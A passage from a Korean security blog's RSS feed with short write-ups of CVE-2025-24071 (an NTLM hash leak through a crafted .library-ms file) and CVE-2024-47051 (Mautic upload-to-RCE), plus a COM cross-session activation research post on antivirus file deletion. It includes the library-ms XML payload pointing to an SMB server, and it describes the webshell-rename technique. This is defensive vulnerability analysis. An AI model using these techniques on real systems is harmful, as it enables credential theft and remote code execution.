class="hljs-string">&quot;http://schemas.microsoft.com/windows/2009/library&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">searchConnectorDescriptionList</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">searchConnectorDescription</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">simpleLocation</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>\\192.168.1.116\shared<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">simpleLocation</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">searchConnectorDescription</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">searchConnectorDescriptionList</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">libraryDescription</span>&gt;</span></code></pre><p>&#xC555;&#xCD95;&#xC774; &#xD574;&#xC81C;&#xB418;&#xBA74; <code>&lt;url&gt;</code> element&#xC5D0; &#xC800;&#xC7A5;&#xB41C; SMB &#xACBD;&#xB85C;&#xB97C; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130; &#xB4F1;&#xC744; &#xAC00;&#xC838;&#xC624;&#xAE30; &#xC704;&#xD574; resolve&#xD558;&#xACE0; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; User Interaction &#xC5C6;&#xC774; NTLM Hash&#xAC00; &#xC11C;&#xBC84;&#xB85C; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <a href="https://github.com/0x6rss/CVE-2025-24071_PoC">PoC</a>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; SMB &#xC11C;&#xBC84;&#xC5D0; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; NTLM &#xC778;&#xC99D;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA74;&#xC11C; NTLM Hash&#xAC00; &#xC804;&#xC1A1;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><iframe width="560" height="315" src="https://cti.monster/assets/video/wireshark.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><blockquote><p>&#xCD9C;&#xCC98;: <a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html">https://cti.monster/blog/2025/03/18/CVE-2025-24071.html</a></p></blockquote><p>&#xC774;&#xB7EC;&#xD55C; &#xB3D9;&#xC791;&#xC740; File Explorer&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD3EC;&#xB9F7;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xACE0; .library-ms &#xD30C;&#xC77C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC554;&#xBB35;&#xC801;&#xC73C;&#xB85C; &#xC2E0;&#xB8B0;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xCC98;&#xB7FC; ProcMon&#xC744; &#xD1B5;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xD30C;&#xC77C;&#xC758; &#xC555;&#xCD95;&#xC774; &#xD574;&#xC81C;&#xB41C; &#xD6C4; Explorer.exe&#xC640; SearchProtocolHost.exe&#xAC00; .library-ms &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><iframe width="560" height="315" src="https://cti.monster/assets/video/procmon.mp4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><blockquote><p>&#xCD9C;&#xCC98;: <a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html">https://cti.monster/blog/2025/03/18/CVE-2025-24071.html</a></p></blockquote>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/NTLM/">NTLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/SMB/">SMB</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/20/pwndorei/2025-03-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-47051: Mautic의 임의 파일 업로드로 인한 RCE</title>
      <link>https://hackyboiz.github.io/2025/03/19/OUYA77/2025-03-19/</link>
      <guid>https://hackyboiz.github.io/2025/03/19/OUYA77/2025-03-19/</guid>
      <pubDate>Wed, 19 Mar 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.sonicwall.com/blog/critical-mautic-vulnerabil</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.sonicwall.com/blog/critical-mautic-vulnerability-cve-2024-47051-enables-arbitrary-file-uploads">https://www.sonicwall.com/blog/critical-mautic-vulnerability-cve-2024-47051-enables-arbitrary-file-uploads</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Mautic &lt; 5.2.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Mautic&#xC740; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xB9C8;&#xCF00;&#xD305; &#xC790;&#xB3D9;&#xD654; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xC774; Mautic&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xC784;&#xC758; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC;&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="&#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD30C;&#xC77C; &#xCC98;&#xB9AC;"></p><p>&#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD30C;&#xC77C; &#xCC98;&#xB9AC;</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>asset</code>&#xC744; &#xCD94;&#xAC00;/&#xD3B8;&#xC9D1;&#xD560; &#xB54C; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xAE30;&#xB2A5;&#xC758; &#xBCF4;&#xC548; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB17C;&#xB9AC;&#xC801; &#xACB0;&#xD568;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xAE30;&#xB2A5;&#xC740; &#xCD94;&#xAC00;/&#xD3B8;&#xC9D1; &#xB3D9;&#xC791;&#xC5D0; &#xB300;&#xD574; &#xAC01;&#xAC01; <code>public function newAction</code> &#xBC0F; <code>public function editAction</code>&#xC73C;&#xB85C; &#xC815;&#xC758;&#xB429;&#xB2C8;&#xB2E4;. &#xC704; &#xADF8;&#xB9BC;&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC5C5;&#xB85C;&#xB4DC;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC788;&#xACE0; &#xD30C;&#xC77C;&#xC744; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC4F0;&#xB294; &#xBB38;&#xC81C;&#xC758; &#xD568;&#xC218; <code>preUpload()</code> &#xBC0F; <code>upload()</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%201.png" alt="preUpload &#xD568;&#xC218;"></p><p>preUpload &#xD568;&#xC218;</p><p><code>preUpload()</code> &#xD568;&#xC218;&#xB294; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC800;&#xC7A5;&#xB420; &#xCD5C;&#xC885; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xACFC; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC740; SHA1 &#xD574;&#xC2DC;&#xB85C; &#xC0DD;&#xC131;&#xB418;&#xBA70;, &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC774; &#xD575;&#xC2EC;&#xC785;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; MIME &#xC720;&#xD615;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; <code>guessExtension()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xCD94;&#xC815;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xD328;&#xD560; &#xACBD;&#xC6B0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xACF5;&#xD55C; <code>originalFileName</code>&#xC758; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xD5C8;&#xC6A9;&#xB41C; &#xD655;&#xC7A5;&#xC790;(&#xC608;: .jpg)&#xB85C; PHP &#xCF54;&#xB4DC;&#xB97C; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; &#xD6C4;, &#xD574;&#xB2F9; &#xD30C;&#xC77C; &#xC694;&#xCCAD; &#xC2DC; <code>originalFileName</code>&#xC758; &#xD655;&#xC7A5;&#xC790;&#xB97C; .php&#xB85C; &#xBCC0;&#xACBD;&#xD558;&#xC5EC; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>guessExtension()</code>&#xC740; NULL&#xC744; &#xBC18;&#xD658;&#xD558;&#xACE0;, &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; .php &#xD655;&#xC7A5;&#xC790;&#xAC00; &#xC801;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image%202.png" alt="upload &#xD568;&#xC218;"></p><p>upload &#xD568;&#xC218;</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; <code>upload()</code> &#xD568;&#xC218;&#xB294; &#xC815;&#xC758;&#xB41C; &#xC5C5;&#xB85C;&#xB4DC; &#xB514;&#xB809;&#xD1A0;&#xB9AC;(default: media/files/)&#xC5D0;&#xC11C; <code>preUplaod()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD55C; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xACFC; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD30C;&#xC77C;&#xC744; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC784;&#xC2DC; &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xC5EC; <code>allowed_extensions</code> &#xAD6C;&#xC131; &#xBCC0;&#xC218;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xD544;&#xD130;&#xB97C; &#xC6B0;&#xD68C;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="&#xCDE8;&#xC57D;&#xC810;-&#xC694;&#xC57D;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xC694;&#xC57D;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xC694;&#xC57D;"></a>&#xCDE8;&#xC57D;&#xC810; &#xC694;&#xC57D;</h3><ul><li>&#xACF5;&#xACA9;&#xC790;&#xB294; <code>shell1.png</code>&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>preUpload()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; MIME &#xC720;&#xD615;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; <code>guessExtension()</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xD328;&#xD558;&#xC5EC; <code>NULL</code>&#xC744; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB530;&#xB77C;&#xC11C; &#xCF54;&#xB4DC;&#xAC00; <code>originalFileName</code>&#xC758; &#xD655;&#xC7A5;&#xC790;(<code>.php</code>)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xCD5C;&#xC885; &#xD30C;&#xC77C;&#xBA85;&#xC774; <code>shell1.php</code>&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.<ul><li>&#xC774;&#xB54C;, &#xACF5;&#xACA9;&#xC790;&#xB294; <code>asset</code> &#xC800;&#xC7A5; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xB54C; <code>.php</code> &#xD655;&#xC7A5;&#xC790;&#xB85C; <code>originalFileName</code>&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xC11C; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p><img src="image%203.png" alt="image.png"></p><ul><li>&#xACF5;&#xACA9;&#xC790;&#xAC00; php &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD558;&#xACE0; www-data&#xC5D0; &#xB300;&#xC0C1; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xBC0F; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;-&#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xC73C;&#xBA74; RCE &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>allowed extensions</code>&#xC5D0;&#xC11C; <code>allowd_mimetypes</code>&#xB85C; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xD544;&#xD130;&#xB9C1;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xB4F1;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; <a href="https://github.com/mautic/mautic/commit/75bc488ce98b9c8ec01114984049fc1c42c0cae5">&#xB9C1;&#xD06C;</a>&#xB97C; &#xD655;&#xC778;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/mautic/mautic">https://github.com/mautic/mautic</a></p><p><a href="https://github.com/mautic/mautic/security/advisories/GHSA-73gx-x7r9-77x2">https://github.com/mautic/mautic/security/advisories/GHSA-73gx-x7r9-77x2</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47051">https://nvd.nist.gov/vuln/detail/CVE-2024-47051</a></p><p><a href="https://github.com/mautic/mautic/commit/75bc488ce98b9c8ec01114984049fc1c42c0cae5">https://github.com/mautic/mautic/commit/75bc488ce98b9c8ec01114984049fc1c42c0cae5</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Mautic/">Mautic</category>
      
      <category domain="https://hackyboiz.github.io/tags/OpenSource/">OpenSource</category>
      
      <category domain="https://hackyboiz.github.io/tags/File-Upload/">File Upload</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/19/OUYA77/2025-03-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] COM Object - Part 3(Cross-Session Activation)(EN)</title>
      <link>https://hackyboiz.github.io/2025/03/16/ogu123/Com_Object_Part3/EN/</link>
      <guid>https://hackyboiz.github.io/2025/03/16/ogu123/Com_Object_Part3/EN/</guid>
      <pubDate>Sun, 16 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h3&gt;&lt;p&gt;Hello, this is ogu123!!!&lt;/p&gt;
&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>Hello, this is ogu123!!!</p><p>In Part3, we&#x2019;ll look at Cross Session Activation, which occurs when a COM object is set to Interactive User, and continue with <a href="https://hackyboiz.github.io/2024/12/22/ogu123/COM_Object_part2/ko/">Part2</a> finding vulnerable COMs in a specific program!</p><p>This time, there won&#x2019;t be much theory, so you can relax, and let&#x2019;s get to work!</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/1.jpg" alt></p><h3 id="COM-Security"><a href="#COM-Security" class="headerlink" title="COM Security"></a>COM Security</h3><p>COM objects can use COM Security to control object creation, access, permissions, and more.</p><p>Among the many settings for COM Security, Application Identity determines which account permissions the COM object uses when it runs.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/2.png" alt><br>When you check the properties of a particular DCOM object in Component Services, you see that it is set to Interactive User.</p><p>In this context, Interactive User is a setting that runs the COM object with the privileges of the currently logged in user.</p><p>This is because COM objects that are capable of cross-session activation must be set to Interactive User.</p><p>To better understand this, let&#x2019;s first look at the concept of Windows Session Isolation.</p><h3 id="Windows-Session-Isolation"><a href="#Windows-Session-Isolation" class="headerlink" title="Windows Session Isolation"></a>Windows Session Isolation</h3><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/3.png" alt></p><p>In Windows XP and Windows Server 2003 and earlier, when a user first logged in, both the user application and Windows services ran in Session 0.</p><p>Attackers exploited this to target service processes with high privileges and interact with user applications to gain elevation of privilege.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/4.png" alt></p><p>To address this issue, the following security policies have been in place since Windows 7</p><ol><li>logged-in users are assigned different sessions (1, 2, 3&#x2026;) sequentially</li><li>services running in session 0 are restricted from interacting with user sessions.</li></ol><p>This resulted in complete separation of sessions, so services could not directly interact with user applications running in other sessions.</p><p>However&#x2026; Cross-Session Activation can occur here if a COM object set to Interactive User exists.</p><h3 id="Cross-Session-Activation"><a href="#Cross-Session-Activation" class="headerlink" title="Cross-Session Activation"></a>Cross-Session Activation</h3><p>Cross-Session Activation is a technique for literally activating a COM object across sessions.</p><p>In addition to the interactive user, the following conditions must be met to create a cross-session COM object through the Session Moniker.</p><ul><li>INTERACTIVE exists in the Start and Activate COM Object permission</li><li>Existence of appropriate permissions in the process Access Security (Authenticated Users, &#x2026;)</li></ul><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/5.png" alt></p><blockquote><p>Source : <a href="https://decoder.cloud/2024/08/02/the-fake-potato/">Windows File Explorer EoP (CVE-2024-38100)</a></p></blockquote><p>CVE-2024-38100 is an EoP vulnerability due to COM Cross-Session Activation because the DCOM object in Explorer (Hight IL) satisfies all the conditions for Cross-Session Activation and contains a ShellExecute method.</p><p>Although MS claimed that cross-session activation is only possible for Interactive User, it was found that SYSTEM can also be cross-session activated through <a href="https://issues.chromium.org/issues/341803763">Chrome Updater EoP (CVE-2024-7023)</a>.</p><h3 id="Finding-Cross-Session-Activation-COMs"><a href="#Finding-Cross-Session-Activation-COMs" class="headerlink" title="Finding Cross Session Activation COMs"></a>Finding Cross Session Activation COMs</h3><p>How do you find COM objects that you can leverage for cross-session activation?</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/6.png" alt></p><p>First, you can use PowerShell to filter all registered COM objects to &#x201C;Interactive User&#x201D; and find them one by one, checking if they fulfill the conditions mentioned above.</p><p>My recommendation is to use the <a href="https://github.com/CICADA8-Research/COMThanasia">COMThanasia Tool</a>, which is much more convenient because you can see RunAs, AppIDs, CLSIDs, etc. at a glance.</p><h3 id="Find-vulnerable-COMs-in-a-specific-program"><a href="#Find-vulnerable-COMs-in-a-specific-program" class="headerlink" title="Find vulnerable COMs in a specific program"></a>Find vulnerable COMs in a specific program</h3><p>Now let&#x2019;s continue with Part 2 and look for vulnerable COM objects in antivirus programs!</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/7.png" alt></p><p>After checking only the Launch permission, we found Name(A), which appears to be related to the target program.</p><p>The corresponding AppID (xxxxxxxx-xxxx-xxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx) object says that it is not available, which is a static analysis, so we recommend that you recheck it after creating the object.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/8.png" alt></p><p>We looked for CLSIDs using the AppID (xxxxxxxx-xxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx) and found two CLSIDs.</p><ul><li>xxxxxxxx-xxxx-xxxx-AAAA-AAAAAAAAAAAA (File Handler)</li><li>xxxxxxxx-xxxx-xxxx-BBBB-BBBBBBBBBBBB</li></ul><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/9.png" alt></p><p>First, I checked the xxxxxxxx-xxxx-xxxx-AAAA-AAAAAAAAAAAA (File Handler) CLSID via <a href="http://oleview.net/">OleView.Net</a>, and got lucky and found the IDispatch interface and Typelib!</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/10.png" alt></p><p>With trepidation, I looked into Typelib and found several file-related methods within the File Handler interface.</p><p>Of these, the GoFileDelete method was my first thought of a File Delete vulnerability.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/11.png" alt></p><p>To summarize, we have verified that the CLSID (xxxxxxxx-xxxx-xxxx-AAAA-AAAAAAAAAAAAAA) is a COM object that exists within TARGET.exe and that the Integrity Level (IL) of TARGET.exe is System.</p><p>Finally, we should have checked the Application Identity value of the COM object, but Thinking I had already found the zero-day, I used the GoFileDelete method without checking.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/12.png" alt></p><p>I tried to delete notepad.exe inside the System32 folder via the GoFileDelete method, but it failed&#x2026;</p><p>Frustrated, I moved on, thinking at the time that the Application Identity value was The Launching User.</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/13.png" alt></p><p>While writing the articles, I remembered that I hadn&#x2019;t checked the Application Identity, so I checked it and it was SYSTEM?!</p><p>I thought about why the GoFileDelete method failed and came up with the following guess.</p><ul><li>Before deleting a file, we filter out files in protected directories like C:\Windows, C:\windows\system32, C:\Program Files, etc.</li><li>Blacklist file extensions like .exe, .dll, .db, etc. to filter them out</li></ul><p><img src="/2025/03/16/ogu123/Com_Object_Part3/EN/14.png" alt></p><p>After applying GoFileDelete to all the files in the System32 folder, we see that we can&#x2019;t delete files like exe, dll, db, but we can delete ini, chm files, etc.</p><p>So&#x2026; all that&#x2019;s left is to check with the IDA to see exactly which files the GoFileDelete method can delete! (I will&#x2026;)</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>In this article, we looked at the Cross Session Activation technique and how we almost found a File Delete vulnerability in COM inside AntiVirus&#x2026;!</p><p>Now, let&#x2019;s analyze with IDA and find the File Delete vulnerability, or if that doesn&#x2019;t work, let&#x2019;s try to piece it together and find a COM zero-day because there are other methods related to files. (I wonder why there is no Execute method&#x2026;)</p><p>Thank you for reading this long post.</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><p><a href="https://www.tiraniddo.dev/2018/09/finding-interactive-user-com-objects_9.html">https://www.tiraniddo.dev/2018/09/finding-interactive-user-com-objects_9.html</a></p></li><li><p><a href="https://blog.compass-security.com/2024/10/com-cross-session-activation/">https://blog.compass-security.com/2024/10/com-cross-session-activation/</a></p></li><li><p><a href="https://note-ing.tistory.com/65">https://note-ing.tistory.com/65</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/COM-Object/">COM Object</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Cross-Session-Activation/">Cross-Session Activation</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows-Session-Isolation/">Windows Session Isolation</category>
      
      <category domain="https://hackyboiz.github.io/tags/AntiVirus/">AntiVirus</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/16/ogu123/Com_Object_Part3/EN/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] COM Object - Part 3(Cross-Session Activation)(KR)</title>
      <link>https://hackyboiz.github.io/2025/03/16/ogu123/Com_Object_Part3/KR/</link>
      <guid>https://hackyboiz.github.io/2025/03/16/ogu123/Com_Object_Part3/KR/</guid>
      <pubDate>Sun, 16 Mar 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h3&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! ogu123&#xC785;&#xB2C8;&#xB2E4;!! </p><p>Part3&#xB294; COM &#xAC1D;&#xCCB4;&#xAC00; Interactive User&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5C8;&#xC744; &#xB54C;, &#xBC1C;&#xC0DD;&#xD558;&#xB294; Cross Session Activation&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0; <a href="https://hackyboiz.github.io/2024/12/22/ogu123/COM_Object_part2/ko/">Part2</a> &#xD2B9;&#xC815; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xD55C; COM &#xCC3E;&#xAE30;&#xB97C; &#xC774;&#xC5B4; &#xAC00;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC774;&#xB860;&#xC774; &#xB9CE;&#xC774; &#xC5C6;&#xC5B4; &#xD3B8;&#xD558;&#xAC8C; &#xBCF4;&#xC2DC;&#xBA74; &#xB420; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;! &#xADF8;&#xB7FC; &#xC2E0;&#xB098;&#xAC8C; &#xACF5;&#xBD80;&#xD558;&#xB7EC; &#xAC00;&#xBCF4;&#xC8E0;!</p><p><img src="/2025/03/16/ogu123/Com_Object_Part3/KR/1.jpg" alt></p><h3 id="COM-Security"><a href="#COM-Security" class="headerlink" title="COM Security"></a>COM Security</h3><p>COM &#xAC1D;&#xCCB4;&#xB294; COM Security&#xC744; &#xD1B5;&#xD574; &#xAC1D;&#xCCB4; &#xC0DD;&#xC131;, &#xC811;&#xADFC;, &#xAD8C;&#xD55C; &#xB4F1;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>COM Security&#xC744; &#xC704;&#xD55C; &#xC5EC;&#xB7EC; &#xC124;&#xC815; &#xC911; Application Identity&#xB294; COM &#xAC1D;&#xCCB4;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB54C; &#xC0AC;&#xC6A9;&#xD560; &#xACC4;&#xC815; &#xAD8C;&#xD55C;&#xC744; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img 